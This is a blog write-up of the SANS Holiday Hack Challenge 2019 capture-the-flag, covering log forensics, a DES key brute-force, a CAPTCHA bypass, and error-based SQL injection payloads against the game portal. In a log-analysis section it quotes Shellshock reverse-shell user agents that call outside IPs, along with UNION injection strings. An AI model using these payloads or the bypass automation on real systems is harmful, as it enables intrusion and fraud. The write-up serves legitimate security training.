---
layout: post
title: "SANS Holiday Hack Challange 2019: Writeup"
date: 2020-01-14 00:30
type: post
published: true
comments: true
categories: ctf
---

Here are my solutions for the 2019 SANS Holiday Hack Challenge.

## Objective 0 - Talk to Santa in the Quad

> Enter the campus quad and talk to Santa.

Simply exit the station and talk to Santa standing in the yard.

## Objective 1 - Find the Turtle Doves

> Find the missing turtle doves.

Walking around the campus the doves are eventually found inside the student union.

## Objective 2 - Unredact Threatening Document

> Someone sent a threatening letter to Elf University. What is the first word in ALL CAPS in the subject line of the letter? Please find the letter in the Quad.

In the top left corner of the yard, the PDF can be found lying on the ground.
The document has been redacted by simply adding rectangles on top of the text with the text data still present in the document.
One way to solve this is to simply open the document in a PDF reader, select and copy all text (CTRL+A, CTRL+C) and paste into a text editor.

The text includes the subject line:

> Subject: DEMAND: Spread Holiday Cheer to Other Holidays and Mythical Characters… OR ELSE!

Thus giving us the final answer "DEMAND".

## Objective 3 - Windows Log Analysis: Evaluate Attack Outcome

> We're seeing attacks against the Elf U domain! Using the event log data, identify the user account that the attacker compromised using a password spray attack. Bushy Evergreen is hanging out in the train station and may be able to help you out.

We can analyze the event logs with the Python library "python-evtx" which can be installed with pip and the accompanying log dump script which we download from the GitHub repository:

{% highlight bash %}
$ pip3 install --user python-evtx
$ wget https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py
{% endhighlight %}

Using this we look for successful logins for accounts and fetch a list of usernames which haves logged in.

{% highlight bash %}
$ python3 evtx-dump.py Security.evtx | grep -C20  4624 | grep 'TargetUserName' | sort | uniq
<Data Name="TargetUserName">DC1$</Data>
<Data Name="TargetUserName">gchocolatewine</Data>
<Data Name="TargetUserName">mstripysleigh</Data>
<Data Name="TargetUserName">pminstix</Data>
<Data Name="TargetUserName">sgreenbells</Data>
<Data Name="TargetUserName">supatree</Data>
{% endhighlight %}

We can then look at the number of login attempts (event 4648) and failures (4625) for each of those usernames

{% highlight bash %}
$ python3 evtx-dump.py Security.evtx | grep -C20 supatree | grep 'EventID' | sort | uniq -c | sort -nr
    154 <EventID Qualifiers="">4648</EventID> <-- login attempt
     76 <EventID Qualifiers="">4625</EventID> <-- login failed
      3 <EventID Qualifiers="">4672</EventID>
      2 <EventID Qualifiers="">4776</EventID>
      2 <EventID Qualifiers="">4634</EventID>
      2 <EventID Qualifiers="">4624</EventID>

$ python3 evtx-dump.py Security.evtx | grep -C20 sgreenbells | grep 'EventID' | sort | uniq -c | sort -nr
    154 <EventID Qualifiers="">4648</EventID>
     77 <EventID Qualifiers="">4625</EventID>

$ python3 evtx-dump.py Security.evtx | grep -C20 gchocolatewine | grep 'EventID' | sort | uniq -c | sort -rn
    154 <EventID Qualifiers="">4648</EventID>
     77 <EventID Qualifiers="">4625</EventID>

$ python3 evtx-dump.py Security.evtx | grep -C20 mstripysleigh | grep 'EventID' | sort | uniq -c | sort -rn
    152 <EventID Qualifiers="">4648</EventID>
     77 <EventID Qualifiers="">4625</EventID>
      1 <EventID Qualifiers="">4769</EventID>
      1 <EventID Qualifiers="">4634</EventID>

$ python3 evtx-dump.py Security.evtx | grep -C20 pminstix | grep 'EventID' | sort | uniq -c | sort -nr 
      2 <EventID Qualifiers="">4776</EventID>
      2 <EventID Qualifiers="">4672</EventID>
      2 <EventID Qualifiers="">4634</EventID>
      2 <EventID Qualifiers="">4624</EventID>
      1 <EventID Qualifiers="">4769</EventID>
      1 <EventID Qualifiers="">4768</EventID>
{% endhighlight %}

We see that "supatree", "sgreenbells", "gchocolatewine" and "mstripysleigh" all have been targeted by a lot of login attempts.
However, "supatree" has one fewer failed login compared to the others and additional events related to logging in. This is therefore the account the attacked managed to log in to.

This gives us the final answer: "supatree"

## Objective 4 - Windows Log Analysis: Determine Attacker Technique

> Using these normalized Sysmon logs, identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process.

Searching the logs for "lsass.exe" returns one event at timestamp 132186398356220000. The event after shows that the following suspicious looking command was run:

{% highlight bash %}
$ ntdsutil.exe  "ac i ntds" ifm "create full c:\hive" q q
{% endhighlight %}

Googling this command shows that it is a common way to dump Active Directory credentials, thus the tool that was used was "ntdsutil.exe".

This gives us the final answer: "ntdsutil".

## Objective 5 - Network Log Analysis: Determine Compromised System

> The attacks don't stop! Can you help identify the IP address of the malware-infected system using these Zeek logs?

By opening the "index.html" file in the zip file we find some statistics about the logs. Clicking "ELFU" and then "Beacons", ie. viewing "elfu-zeeklogs/ELFU/ELFU/beacons.html" shows that there is one computer that has a suspicious number of connections to a specific IP address.

| Score | Source          | Destination    | Connections | Avg. Bytes | Intvl. Range | Size Range | Intvl. Mode | Size Mode | ... |
|-------|-----------------|----------------|-------------|------------|--------------|------------|-------------|-----------|-----|
| 0.998 | 192.168.134.130 | 144.202.46.214 | 7660        | 1156.000   | 10           | 683        | 10          | 563       | ... |

Furthermore, by looking at the "Long Connections" page, ie. viewing "elfu-zeeklogs/ELFU/ELFU/long-conns.html" we again find the same IP address having a very long running connection.

| Source          | Destination  | DstPort:Protocol:Service | Duration  |
|-----------------|--------------|--------------------------|-----------|
| 192.168.134.130 | 148.69.64.76 | 443:tcp:-, 443:tcp:ssl   | 1035.9001 |

Both of these things contribute to suspecting that this is the malware infected system.

This gives us the final answer: "192.168.134.130".

## Objective 6 - Splunk

> Access https://splunk.elfu.org/ as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along!

After logging in to the SOC system we can read the chat to find that there is a system called "sweetums" communicating with a weird IP. This system belongs to "Professor Banas".
Following suggestions from Alice, we can search for "index=main santa" to find data related to "the big guy" (Santa). This shows us that some obfuscated powershell script has accessed a file called "Naughty_and_Nice_2019_draft.txt".
Again, following advice from Alice, using the search "index=main sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational powershell EventCode=3" and checking the "dest_host" field, we find a host called "144.202.46.214.vultr.com".
The next step is to find the document that launched the malicious PowerShell code. Following the guidance from Alice and keeping in mind whether the PID is in hex or decimal eventually leads us to the following command:

> C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Windows\Temp\Temp1_Buttercups_HOL404_assignment (002).zip\19th Century Holiday Cheer Assignment.docm" /o "


We can then use stoQ to search for unique email addresses. Using the following query groups the emails by sender (case-insensitive):

> index=main sourcetype=stoq | rename results{}.workers.smtp.from as from| eval from=lower(from)| top limit=100 from

This shows 22 unique addresses but one of them if the professor himself leaving us with 21 unique senders.
To find the password for the zip we search for "password" among the email bodies using the following query:

> index=main sourcetype=stoq password | table results{}.workers.smtp.from results{}.workers.smtp.body

This reveals that the password is "123456789" and was sent together with the zip file by "bradly.buttercups@eifu.org".
To get the actual file we use the following stoQ query as suggested by Alice:

> index=main sourcetype=stoq  "results{}.workers.smtp.from"="bradly buttercups <bradly.buttercups@eifu.org>" | eval results = spath(_raw, "results{}") 
> | mvexpand results
> | eval path=spath(results, "archivers.filedir.path"), filename=spath(results, "payload_meta.extra_data.filename"), fullpath=path."/".filename 
> | search fullpath!="" 
> | table filename,fullpath

But when we try to download the file we get the following message:

{% highlight bash %}
$ curl -v 'https://elfu-soc.s3.amazonaws.com/stoQ%20Artifacts/home/ubuntu/archive/c/6/e/1/7/c6e175f5b8048c771b3a3fac5f3295d2032524af'
{% endhighlight %}

> In the real world, This would have been a wonderful artifact for you to 
> investigate, but it had malware in it of course so it's not posted here.
> Fear not! The core.xml file that was a component of this original macro-enabled
> Word doc is still in this File Archive thanks to stoQ.
> Find it and you will be a happy elf :-)

So instead we look at the "core.xml" file

{% highlight bash %}
$ curl -v 'https://elfu-soc.s3.amazonaws.com/stoQ%20Artifacts/home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4'
{% endhighlight %}

> <cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:title>Holiday Cheer Assignment</dc:title><dc:subject>19th Century Cheer</dc:subject><dc:creator>Bradly Buttercups</dc:creator><cp:keywords></cp:keywords><dc:description>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</dc:description><cp:lastModifiedBy>Tim Edwards</cp:lastModifiedBy><cp:revision>4</cp:revision><dcterms:created xsi:type="dcterms:W3CDTF">2019-11-19T14:54:00Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2019-11-19T17:50:00Z</dcterms:modified><cp:category></cp:category></cp:coreProperties>

Where we find the message: "Kent you are so unfair. And we were going to make you the king of the Winter Carnival."

In summary, the answers to the questions are:  
Training 1: sweetums  
Training 2: C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt  
Training 3: 144.202.46.214.vultr.com  
Training 4: 19th Century Holiday Cheer Assignment.docm  
Training 5: 21  
Training 6: 123456789  
Training 7: bradly.buttercups@eifu.org  
The message: "Kent you are so unfair. And we were going to make you the king of the Winter Carnival."  

## Objective 7 - Get Access To The Steam Tunnels

> Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name.

When we enter "Minty's Dorm Room", we notice a person going into the closet. Using the "Network" tab of the Chrome developer tools we can grab picture of the suspicious individual:

![Krampus](/assets/images/ctf/sans19-krampus.png)

The key he is carrying seems to have six notches with the sixth one being barely noticeable. By using the key cutter tool and experimenting a little bit with the various depth settings, eventually we can produce the following key:

![Copy of Krampu's key](/assets/images/ctf/sans19-122520.png)

Submitting this key to the lock opens the door and we can go and talk to the individual who introduces himself as "Krampus Hollyfeld" which is the answer to the objective.

## Objective 8 - Bypassing the Frido Sleigh CAPTEHA

> Help Krampus beat the Frido Sleigh contest.

To solve this challenge, we start by checking out the talk ["Machine Learning Use Cases for Cybersecurity"](https://www.youtube.com/watch?v=jmVPLwjm_zs) by Chris Davis.
Using [his tool published on GitHub](https://github.com/chrisjd20/img_rec_tf_ml_demo) we can then almost drop in the images provided by Krampus straight to the tool and let it train a classification model for the christmas themed images.
Having the finished model, we then combine some of the example code from Chris' script with the template script "capteha_api.py" which Krampus has built.
Essentially we add something like the following to the "Machine learning code goes here" part of his script.

{% highlight python %}
types_lower = [x.lower() for x in challenge_image_types]

# Loading the Trained Machine Learning Model created
# from running retrain.py on the training_images directory
graph = load_graph('/tmp/retrain_tmp/output_graph.pb')
labels = load_labels("/tmp/retrain_tmp/output_labels.txt")

# Load up our session
input_operation = graph.get_operation_by_name("import/Placeholder")
output_operation = graph.get_operation_by_name("import/final_result")
sess = tf.compat.v1.Session(graph=graph)

# Can use queues and threading to spead up the processing
q = queue.Queue()
for image in b64_images:
    print('Processing Image {}'.format(image['uuid']))
    # We don't want to process too many images at once. 10 threads max
    while len(threading.enumerate()) > 10:
        time.sleep(0.0001)

    image_bytes = base64.b64decode(image['base64'])
    img_full_path = image['uuid']
    threading.Thread(target=predict_image, args=(q, sess, graph, 
                       image_bytes, img_full_path, labels, input_operation, 
                       output_operation)).start()

print('Waiting For Threads to Finish...')
while q.qsize() < len(b64_images):
    time.sleep(0.001)

prediction_results = [q.get() for x in range(q.qsize())]

message = '{img_full_path} is a {prediction} with {percent:.2%} Accuracy'
for prediction in prediction_results:
    print(message.format(**prediction))


final_answer = [x for x in final_answer if x['prediction'] in types_lower])
final_answer = [x['img_full_path'].split('/') for x in final_answer]
final_answer = ','.join([x[-1].split('.')[0] for x in final_answer])

{% endhighlight %}

Initially, when trying the run the script, my VM was too slow to be able to do it before the captcha timed out.
Instead I uploaded the code and the classification model to a 96 core AWS VM (thanks for per-second billing) and ran it there.
That produced the following output:

{% highlight bash %}
$ python3 capteha_api.py 
WARNING:tensorflow:From capteha_api.py:11: The name tf.logging.set_verbosity is deprecated. Please use tf.compat.v1.logging.set_verbosity instead.
WARNING:tensorflow:From capteha_api.py:11: The name tf.logging.ERROR is deprecated. Please use tf.compat.v1.logging.ERROR instead.

Processing Image b7bd0ca2-e584-11e9-97c1-309c23aaf0ac
Processing Image bf16f3fe-e584-11e9-97c1-309c23aaf0ac
...
Processing Image 30e14fb6-e588-11e9-97c1-309c23aaf0ac
Processing Image 450b158a-e588-11e9-97c1-309c23aaf0ac
Waiting For Threads to Finish...
TensorFlow Predicted c3a916e7-e584-11e9-97c1-309c23aaf0ac is a Stockings with 95.03% Accuracy
...
TensorFlow Predicted 21da2ca1-e588-11e9-97c1-309c23aaf0ac is a Stockings with 99.97% Accuracy
TensorFlow Predicted 30e14fb6-e588-11e9-97c1-309c23aaf0ac is a Stockings with 99.81% Accuracy
77325d4a-e587-11e9-97c1-309c23aaf0ac,0bc4fa46-e588-11e9-97c1-309c23aaf0ac,f8f84d37-e587-11e9-97c1-309c23aaf0ac,90401425-e585-11e9-97c1-309c23aaf0ac,90f2902a-e586-11e9-97c1-309c23aaf0ac,3d906293-e587-11e9-97c1-309c23aaf0ac,b6370b2a-e586-11e9-97c1-309c23aaf0ac,78234a66-e586-11e9-97c1-309c23aaf0ac,4ca13fd4-e587-11e9-97c1-309c23aaf0ac,928db7c2-e587-11e9-97c1-309c23aaf0ac,f8080294-e585-11e9-97c1-309c23aaf0ac,6ac79637-e587-11e9-97c1-309c23aaf0ac,303a3180-e588-11e9-97c1-309c23aaf0ac,6469d904-e585-11e9-97c1-309c23aaf0ac,acce385e-e586-11e9-97c1-309c23aaf0ac,71610c5b-e585-11e9-97c1-309c23aaf0ac,eb360396-e587-11e9-97c1-309c23aaf0ac,8e57d269-e587-11e9-97c1-309c23aaf0ac,50f0a2c2-e587-11e9-97c1-309c23aaf0ac,301420f7-e587-11e9-97c1-309c23aaf0ac,fb175175-e587-11e9-97c1-309c23aaf0ac,1b2bd27f-e588-11e9-97c1-309c23aaf0ac,bf16f3fe-e584-11e9-97c1-309c23aaf0ac
{'data': 'You are not a human!', 'request': True}
CAPTEHA Solved!
Submitting lots of entries until we win the contest! Entry #1
Submitting lots of entries until we win the contest! Entry #2
...
Submitting lots of entries until we win the contest! Entry #101
Submitting lots of entries until we win the contest! Entry #102
{"data":"<h2 id=\"result_header\"> Entries for email address calle.svensson@zeta-two.com no longer accepted as our systems show your email was already randomly selected as a winner! Go check your email to get your winning code. Please allow up to 3-5 minutes for the email to arrive in your inbox or check your spam filter settings. <br><br> Congratulations and Happy Holidays!</h2>","request":true}
{% endhighlight %}

Checking my mailbox I saw that I had received an email with the subject "You're A Winner of the Frido Sleigh Contest!" containing the code "8Ia8LiZEwvyZr2WO".

## Objective 9 - Retrieve Scraps of Paper from Server

> Gain access to the data on the Student Portal server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system?

If we try to submit an application we quickly find that the website has a SQL injection in the INSERT statement used to save the application.
For example, adding a single quote to the essay field yields the following error:

> Error: INSERT INTO applications (name, elfmail, program, phone, whyme, essay, status) VALUES ('1', '3@4.com', '4', '5', '6', '7'', 'pending')
> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'pending')' at line 2

Since the SQL error is printed out we can used error based SQL injection to leak data. For example, by submitting an essay with the following value:

> '*extractvalue(rand(),concat(0x3a, (SELECT version()) ))*'

We get the this error back:

> Error: INSERT INTO applications (name, elfmail, program, phone, whyme, essay, status) VALUES ('x', 'lol+123@kok.com', '1', '2', '3', 'bond'*extractvalue(rand(),concat(0x3a, (SELECT version()) ))*'', 'pending')
> XPATH syntax error: ':10.1.43-MariaDB-1~bionic'

Continuing in the same fashion, we can use the following values to extract the schema names, table names, column names and finally values from the database:

> ; Get schemas  
> '*extractvalue(rand(),concat(0x3a, (SELECT table_schema from information_schema.tables group by table_schema limit 0,1) ))*'  
> '*extractvalue(rand(),concat(0x3a, (SELECT table_schema from information_schema.tables group by table_schema limit 1,1) ))*'  
>   
> ; Get tables in schema "elfu"  
> '*extractvalue(rand(),concat(0x3a, (SELECT table_name from information_schema.tables where table_schema = 'elfu' group by table_name limit 0,1) ))*'  
> '*extractvalue(rand(),concat(0x3a, (SELECT table_name from information_schema.tables where table_schema = 'elfu' group by table_name limit 1,1) ))*'  
> '*extractvalue(rand(),concat(0x3a, (SELECT table_name from information_schema.tables where table_schema = 'elfu' group by table_name limit 2,1) ))*'  
>   
> ; Get columns in table "krampus"  
> '*extractvalue(rand(),concat(0x3a, (SELECT column_name from information_schema.columns where table_name = 'krampus' and table_schema = 'elfu' limit 0,1) ))*'  
> '*extractvalue(rand(),concat(0x3a, (SELECT column_name from information_schema.columns where table_name = 'krampus' and table_schema = 'elfu' limit 1,1) ))*'  
>   
> ; Get values in table "krampus"  
> '*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 0,1) ))*'  
> '*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 1,1) ))*'  
> '*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 2,1) ))*'  
> '*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 3,1) ))*'  
> '*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 4,1) ))*'  
> '*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 5,1) ))*'  


Which results in the following corresponding values:

> ; Schemas  
> elfu  
> information_schema  
>   
> ; Tables of schema "elfu"  
> applications  
> krampus  
> students  
>   
> ; Columns of table "krampus"  
> id  
> path  
>   
> ; Values of column "path" in table "krampus"  
> '/krampus/0f5f510e.png'  
> '/krampus/1cc7e121.png'  
> '/krampus/439f15e6.png'  
> '/krampus/667d6896.png'  
> '/krampus/adb798ca.png'  
> '/krampus/ba417715.png'  


We can then download these files:

{% highlight bash %}
$ wget https://studentportal.elfu.org/krampus/0f5f510e.png
$ wget https://studentportal.elfu.org/krampus/1cc7e121.png
$ wget https://studentportal.elfu.org/krampus/439f15e6.png
$ wget https://studentportal.elfu.org/krampus/667d6896.png
$ wget https://studentportal.elfu.org/krampus/adb798ca.png
$ wget https://studentportal.elfu.org/krampus/ba417715.png
{% endhighlight %}

And read that the name of the guidance system is "super sled-o-matic".

## Objective 10 - Recover Cleartext Document

> The Elfscrow Crypto tool is a vital asset used at Elf University for encrypting SUPER SECRET documents. We can't send you the source, but we do have debug symbols that you can use.
> Recover the plaintext content for this encrypted document. We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC.
> What is the middle line on the cover page? (Hint: it's five words)

Reverse engineering the program we can see that it encrypts the file using DES-CBC with a key generated as follows:

{% highlight c %}
for ( i = 0; i < 8; ++i )
    buffer[i] = super_secure_random();
{% endhighlight %}

With the `super_secure_random()` function working as follows:

{% highlight c %}
int __cdecl super_secure_random()
{
  state = 214013 * state + 2531011;
  return (state >> 16) & 0x7FFF;
}
{% endhighlight %}

We also find that the initial value of `state` set to `time(0)` which is the current timestamp.
Since we know that "it was encrypted on December 6, 2019, between 7pm and 9pm UTC." we can try all possible timestamps in that interval and bruteforce the key since it only depends on the timestamp.

The following Python script re-implements the key derivation and decryption algorithm used in the program.
To know if we have correctly decrypted the file we check if it contains the PDF magic bytes "%PDF" since it seems that the original file was a PDF file.

{% highlight python %}
#!/usr/bin/env python3

from Crypto.Cipher import DES

START_TS = 1575658800

filename = 'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf'

with open('%s.enc' % filename, 'rb') as fin:
    data = fin.read()

# https://github.com/crappycrypto/wincrypto/blob/master/wincrypto/algorithms.py
# IV=null bytes, probably same for DES

def attempt(seed):
    state = seed
    key = []
    for _ in range(8):
        state = 214013 * state + 2531011
        state &= 0xFFFFFFFF
        key.append((state >> 16) & 0x7FFF)
    key = bytes(x & 0xFF for x in key)

    des = DES.new(key, iv=b'\0'*8, mode=DES.MODE_CBC)
    m = des.decrypt(data[:128])
    if b'%PDF' in m:
        des = DES.new(key, iv=b'\0'*8, mode=DES.MODE_CBC)
        m = des.decrypt(data)

        with open(filename, 'wb') as fout:
            fout.write(m)
        return True
    return False

for seed in range(START_TS, START_TS + 60*60*2):
    if attempt(seed):
        print('Found seed: %d' % seed)
        break
{% endhighlight %}

Running this program gives decrypts the file and prints out the following:

```
Found seed: 1575663650
```

Reading the PDF file reveals that the middle line is "Machine Learning Sleigh Route Finder".

## Objective 11 - Open the Sleigh Shop Door

> Visit Shinny Upatree in the Student Union and help solve their problem. What is written on the paper you retrieve for Shinny?

Opening the crate requires us to find a few different codes hidden in various client-side parts of a website.
I used Chrome for this so if another browser is used, some of the views or menus will have other names.

Lock 1: Look in the developer "Console" and the code is printed there.  
Lock 2: Open the print page view (CTRL+P) to reveal the code in the middle of the page.  
Lock 3: Look in the "Network" tab for a request which contains the code in the response.  
Lock 4: The code is located in the "Application" tab under the "Local Storage" section.  
Lock 5: Using the "Elements" tab and looking at the `<title>` tag reveals the code at the end of the contents after a lot of padding.  
Lock 6: Here we can use the "Elements" tab to select the element with the "hologram" class and adjust the "perspective" attribute. Setting it to a large value such as 3000px reveals the code.  
Lock 7: At the top of the page's source code we can find some css with the code in the font property: `.instructions { font-family: 'IKGP7WU7', 'Beth Ellen', cursive; }`  
Lock 8: Using the "Elements" tab and looking in the "Event Listeners" section of the element with the `.eggs` class we find an event called `spoil` which contains the code.  
Lock 9: Using the "Elements" tab, finding all elements with the class `chakra` and with the right-click menu forcing the `:active` state reveals the code.  
Lock 10: We can use the following snippet of JS code in the console three times `document.querySelector('.lock.c10').appendChild(document.querySelector('.component'))` to put all components back in place. Then if we remove the `cover` class from the div on the panel, we reveal the circuit board where the code is printed in the lower right corner.  

Unlocking all 10 locks finally unlocks the door and we find out that the villain is "The Tooth Fairy".

## Objective 12 - Filter Out Poisoned Sources of Weather Data

> Use the data supplied in the Zeek JSON logs to identify the IP addresses of attackers poisoning Santa's flight mapping software. Block the 100 offending sources of information to guide Santa's sleigh through the attack. Submit the Route ID ("RID") success value that you're given.

We can start out by looking for requests containing indicators of XSS, LFI, SQLi or command injection and store those IP addresses in "bad_ip.txt" with the following jq commands:

{% highlight bash %}
$ (\
jq -r '.[]|select(.username|contains("'"'"'"))|."id.orig_h"' http.log;
jq -r '.[]|select(.uri|contains("'"'"'"))|."id.orig_h"' http.log;
jq -r '.[]|select(.user_agent|contains("'"'"'"))|."id.orig_h"' http.log;
jq -r '.[]|select(.uri|contains("<"))|."id.orig_h"' http.log;
jq -r '.[]|select(.host|contains("<"))|."id.orig_h"' http.log;
jq -r '.[]|select(."uri"|contains("passwd"))|."id.orig_h"' http.log;
jq -r '.[]|select(."user_agent"|contains(":; };"))|."id.orig_h"' http.log; \
) | tee -a bad_ip.txt
{% endhighlight %}

If we then take those IP addresses and remove any duplicates we can create one massive jq command to fetch all events associated with those IP addresses:

{% highlight bash %}
$ sort bad_ip.txt|uniq > bad_ip_uniq.txt
$ jq -r '.[]|select(."id.orig_h"|contains("0.216.249.31") or ... or contains("95.166.116.45"))|.' http.log > bad_requests.json
{% endhighlight %}

This is about 60 requests but we need at least 100. We can extract the user agent used in these requests, find all requests made with the same user agents and then sourt them depending on count like this:

{% highlight bash %}
$ jq -r '.user_agent' bad_requests.json |sort|uniq > bad_agents_uniq.txt
$ while read ua; do
  $ua_fix = $(echo $ua | sed "s/'/\\'/g; s/\"/\\\\\"/g")
  jq -r '.[]|select(."user_agent" == "'"$ua_fix"'")|.user_agent' http.log;
done < bad_agents_uniq.txt | sort | uniq -c | sort -nr 
{% endhighlight %}

> 19 Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)  
> 17 Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5  
> 15 Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5  
> ...  
> 9 Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.18) Gecko/2010021501 Ubuntu/9.04 (jaunty) Firefox/3.0.18  
> 9 Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.14) Gecko/20080419 Ubuntu/8.04 (hardy) Firefox/2.0.0.12 MEGAUPLOAD 1.0  
> 5 Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1)  
> ...  
> 1 Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1  
> 1 () { :; }; /bin/bash -i >& /dev/tcp/31.254.228.4/48051 0>&1  
> 1 () { :; }; /bin/bash -c '/bin/nc 55535 220.132.33.81 -e /bin/bash'  
> 1 1' UNION/**/SELECT/**/994320606,1,1,1,1,1,1,1/*&blogId=1  
> 1 1' UNION SELECT 1729540636,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x65,0x72, --  
> 1 1' UNION SELECT '1','2','automatedscanning','1233627891','5'/*  
> 1 1' UNION/**/SELECT/**/1,2,434635502,4/*&blog=1  
> 1 1' UNION SELECT 1,1409605378,1,1,1,1,1,1,1,1/*&blogId=1  

This reveals a bunch of fairly common user agents but also quite a few rare user agents. If we disregard the popular user agents and search for all IP addresses made from user agents seen less than 9 times (stored in "bad_agents_uniq_trim.txt") we get output similar to this:

{% highlight bash %}
$ while read ua;
$ do echo "### $ua";
  ua_fix = $(echo $ua|sed "s/'/\\'/g; s/\"/\\\\\"/g")
  jq -r '.[] | select(."user_agent" == "'"$ua_fix"'")|."id.orig_h"' http.log;
done < bad_agents_uniq_trim.txt 
### Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1)
42.103.246.250
42.103.246.130
42.103.246.130
42.103.246.130
42.103.246.130
### Wget/1.9+cvs-stable (Red Hat modified)
37.216.249.50
129.121.121.48
### RookIE/1.0
45.239.232.245
142.128.135.10
### Opera/8.81 (Windows-NT 6.1; U; en)
...
{% endhighlight %}

Finally we take the IP addresses from the known evil requests from before and combine them with these IP addresses, remove any duplicates and print them comma-separated in a single line.

{% highlight bash %}
$ jq -r '."id.orig_h"' bad_requests.json |sort|uniq > bad_ip.txt
$ cat bad_ip.txt bad_ip2.txt|sort |uniq|tr '\n' ','
{% endhighlight %}
> 0.216.249.31,10.122.158.57,10.155.246.29,102.143.16.184,103.235.93.133,104.179.109.113,106.132.195.153,106.93.213.219,111.81.145.191,116.116.98.205,118.196.230.170,118.26.57.38,1.185.21.112,121.7.186.163,123.127.233.97,126.102.12.53,129.121.121.48,131.186.145.73,132.45.187.177,13.39.153.254,135.203.243.43,135.32.99.116,140.60.154.239,142.128.135.10,148.146.134.52,150.45.133.97,150.50.77.238,158.171.84.209,168.66.108.62,169.242.54.5,173.37.160.150,180.57.20.247,185.19.7.133,186.28.46.179,187.152.203.243,187.178.169.123,190.245.228.38,19.235.69.221,193.228.194.36,194.143.151.224,200.75.228.240,203.68.29.5,211.229.3.254,217.132.156.225,220.132.33.81,2.230.60.70,223.149.180.133,22.34.153.164,2.240.116.254,225.191.220.138,226.102.56.13,226.240.188.154,227.110.45.126,229.133.163.235,229.229.189.246,230.246.50.221,231.179.108.238,233.74.78.199,23.49.177.78,238.143.78.114,249.237.77.152,249.34.9.16,249.90.116.138,250.22.86.40,250.51.219.47,252.122.243.212,253.182.102.55,253.65.40.39,254.140.181.172,25.80.197.172,27.88.56.114,28.169.41.122,29.0.183.220,31.116.232.143,31.254.228.4,33.132.98.193,34.129.179.28,34.155.174.167,37.216.249.50,42.103.246.130,42.103.246.250,42.127.244.30,42.16.149.112,42.191.112.181,44.164.136.41,44.74.106.131,45.239.232.245,48.66.193.176,49.161.8.58,50.154.111.0,52.39.201.107,53.160.218.44,56.5.47.137,61.110.82.125,65.153.114.120,66.116.147.181,68.115.251.76,69.221.145.150,75.215.214.65,75.73.228.192,79.198.89.109,80.244.147.207,81.14.204.154,83.0.8.119,84.147.231.129,84.185.44.166,87.195.80.126,9.206.212.33,92.213.148.0,95.166.116.45,97.220.93.190,


This is roughly 100 addresses which we can submit as a firewall filter.
Doing this and checking the source of "https://srf.elfu.org/santa.html" reveals the route ID:

> $(".textMeter").html("Route Calculation Success! RID:0807198508261964");	

## Extra Objectives - Terminals

Here are the solutions to the terminals presented without explaination.

### Terminal: Exit Ed

{% highlight bash %}
q
{% endhighlight %}

### Terminal: Smart Braces

{% highlight bash %}
$ sudo iptables -P INPUT DROP
$ sudo iptables -P FORWARD DROP
$ sudo iptables -P OUTPUT DROP
$ sudo iptables -F
$ sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
$ sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
$ sudo iptables -A INPUT -p tcp -s 172.19.0.225 --dport 22 -j ACCEPT
$ sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT
$ sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
$ sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
$ sudo iptables -A INPUT -i lo -j ACCEPT
{% endhighlight %}

### Terminal: ls

{% highlight bash %}
$ which ls
/usr/local/bin/ls
$ find / -type f -name ls
/usr/local/bin/ls
/bin/ls
$ /bin/ls
{% endhighlight %}

### Terminal: mongo

{% highlight bash %}
$ ps auxww 
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
elf          1  0.0  0.0  18508  3424 pts/0    Ss   21:47   0:00 /bin/bash
mongo        9  1.4  0.0 1018684 65848 ?       Sl   21:47   0:01 /usr/bin/mongod --quiet --fork --port 12121 --bind_ip 127.0.0.1 --logpath=/tmp/mongo.log
elf         51  0.0  0.0  34400  2936 pts/0    R+   21:49   0:00 ps auxww

$ mongo 127.0.0.1:12121
$ show dbs
$ use elfu
$ show collections
$ db.solution.find()
